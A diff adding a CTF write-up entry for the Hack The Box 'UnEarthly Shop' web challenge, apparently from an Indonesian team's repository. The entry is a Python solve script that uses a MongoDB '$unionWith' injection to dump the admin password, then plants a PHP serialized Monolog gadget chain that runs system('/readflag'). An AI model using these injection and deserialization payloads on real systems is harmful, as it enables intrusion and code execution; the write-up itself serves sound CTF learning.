@@ -648,6 +648,68 @@ diberikan file .sh yang mana didalam nya script bash. lalu pada line 10 terdapat
 
 ![https://cdn.discordapp.com/attachments/1085884758174728202/1088490142966239252/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088490142966239252/image.png)
 
+# UnEarthly Shop - web
+Solve script
+
+```python
+import requests
+from urllib.parse import urljoin
+
+URL = "http://178.62.9.10:31922/"
+# URL = "http://localhost:1337/"
+
+
+class API:
+    def __init__(self, url=URL):
+        self.session = requests.Session()
+        self.url = url
+
+    def products(self, **kwargs):
+        res = self.session.post(urljoin(self.url, "/api/products"), **kwargs)
+        return res.json()
+
+    def login(self, password):
+        res = self.session.post(urljoin(self.url, "/admin/api/auth/login"), data={
+            "username": "admin",
+            "password": password
+        })
+        return res.text
+
+    def users_update(self, **kwargs):
+        res = self.session.post(
+            urljoin(self.url, "/admin/api/users/update"), **kwargs)
+        return res.text
+
+    def dashboard(self):
+        res = self.session.get(urljoin(self.url, "/admin/dashboard"))
+        return res.text
+
+
+if __name__ == "__main__":
+    api = API()
+    # get admin password
+    admin_creds = api.products(json=[{"$unionWith": "users"}])
+    admin_creds = admin_creds[-1]
+    # login with admin password
+    print("password:", admin_creds['password'])
+    api.login(admin_creds['password'])
+    res = api.users_update(json={
+        "_id": 1,
+        "username": "admin",
+        "password": "foo",
+        "access": "a:2:{i:0;O:28:\"www_frontend_vendor_autoload\":0:{}i:1;O:37:\"Monolog\\Handler\\FingersCrossedHandler\":4:{s:16:\"\u0000*\u0000passthruLevel\";i:0;s:10:\"\u0000*\u0000handler\";r:3;s:9:\"\u0000*\u0000buffer\";a:1:{i:0;a:2:{i:0;s:9:\"/readflag\";s:5:\"level\";i:0;}}s:13:\"\u0000*\u0000processors\";a:2:{i:0;s:3:\"pos\";i:1;s:6:\"system\";}}}"
+    },
+        # proxies={"http": "http://0.0.0.0:8080"}
+    )
+    api.login("foo")
+    flag = api.dashboard()
+    print("Flag:", flag.splitlines()[-1])
+```
+
+reference-writeup: [https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2023-the-cursed-mission-writeups/#web---unearthly-shop](https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2023-the-cursed-mission-writeups/#web---unearthly-shop "https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2023-the-cursed-mission-writeups/#web---unearthly-shop")
+
+![](Pasted%20image%2020230324115213.png)
+
 # Our Community Member Write Up
 
 1. Daffainfo [https://github.com/daffainfo/ctf-writeup/tree/main/Cyber Apocalypse 2023 The Cursed Mission](https://github.com/daffainfo/ctf-writeup/tree/main/Cyber%20Apocalypse%202023%20The%20Cursed%20Mission)
